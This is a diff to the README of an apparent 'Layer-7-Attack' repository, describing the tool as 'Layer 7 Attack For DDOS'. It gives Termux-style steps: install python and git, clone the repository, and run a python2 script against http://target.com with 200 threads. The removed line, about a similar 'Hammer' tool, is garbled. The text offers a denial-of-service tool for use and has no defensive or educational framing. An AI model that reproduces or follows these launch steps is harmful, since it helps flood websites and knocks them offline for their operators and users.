@@ -1,2 +1,8 @@
 # Layer-7-Attack
-This Python usageVersi Hammer $ PKG install python $ PKG install git $ git clone https://github.com/cyweb/hammer $ cd hammer $ python2 oct.py -s http://target.com -t 200
+Layer 7 Attack For DDOS
+
+~$ pkg install python 
+~$ pkg install git 
+~$ git clone https://github.com/MusH4ck007/Layer-7-Attack L7a
+~$ cd L7a
+~$ python2 l7a.py -s http://target.com -t 200
